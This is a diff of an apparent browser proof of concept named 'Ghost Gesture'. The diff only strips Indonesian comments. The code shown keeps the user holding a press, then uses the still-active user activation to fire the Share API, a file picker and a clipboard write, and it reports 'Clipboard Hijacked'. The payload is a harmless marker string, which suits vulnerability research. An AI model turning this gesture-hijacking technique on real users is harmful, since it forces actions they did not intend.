@@ -35,7 +35,6 @@
     <div id="status">Tahan terus sampai 1s</div>
 
     <script>
-        // Timer visual
         setTimeout(() => { document.getElementById('timer').innerText = "1s..."; }, 1000);
         setTimeout(() => { document.getElementById('timer').innerText = "LEPAS!"; }, 2000);
 
@@ -46,7 +45,6 @@
                 if (navigator.userActivation.isActive) {
                     let results = [];
 
-                    // 1. Coba Share API (Sangat efektif di Mobile/macOS)
                     try {
                         if (navigator.share) {
                             await navigator.share({ title: 'Ghost Gesture', text: 'PoC Leak', url: window.location.href });
@@ -54,7 +52,6 @@
                         }
                     } catch (err) { console.log("Share failed", err); }
 
-                    // 2. Coba File Picker (Sangat sensitif di Desktop)
                     try {
                         if (window.showOpenFilePicker) {
                             await window.showOpenFilePicker();
@@ -62,7 +59,6 @@
                         }
                     } catch (err) { console.log("File Picker failed", err); }
 
-                    // 3. Fallback ke Clipboard kalau di atas gagal semua
                     try {
                         await navigator.clipboard.writeText("GHOST_GESTURE_LEAK");
                         results.push("✅ Clipboard Hijacked");
